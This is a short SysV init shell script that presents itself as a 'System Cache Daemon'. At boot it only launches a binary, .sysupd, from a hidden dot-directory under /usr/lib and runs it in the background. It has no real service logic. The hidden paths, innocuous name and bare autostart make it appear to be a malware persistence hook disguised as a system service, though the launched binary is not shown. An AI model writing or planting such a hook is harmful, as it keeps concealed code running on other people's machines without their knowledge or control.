#!/bin/sh
### BEGIN INIT INFO
# Provides:          system-cache
# Required-Start:    $local_fs
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: System Cache Daemon
### END INIT INFO

case "$1" in
    start)
        /usr/lib/.system-cache/.sysupd &
        ;;
    *)
        exit 0
        ;;
esac
exit 0
